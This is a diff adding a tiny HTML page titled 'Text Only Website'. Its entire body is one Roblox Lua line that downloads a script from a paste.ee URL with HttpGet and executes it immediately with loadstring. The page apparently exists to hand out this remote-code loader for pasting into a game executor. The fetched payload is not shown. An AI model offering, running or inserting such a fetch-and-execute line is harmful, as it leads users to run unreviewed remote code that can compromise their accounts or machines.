@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Text Only Website</title>
+</head>
+<body>
+    loadstring(game:HttpGet("https://paste.ee/r/34NftnOA"))()
+</body>
+</html>
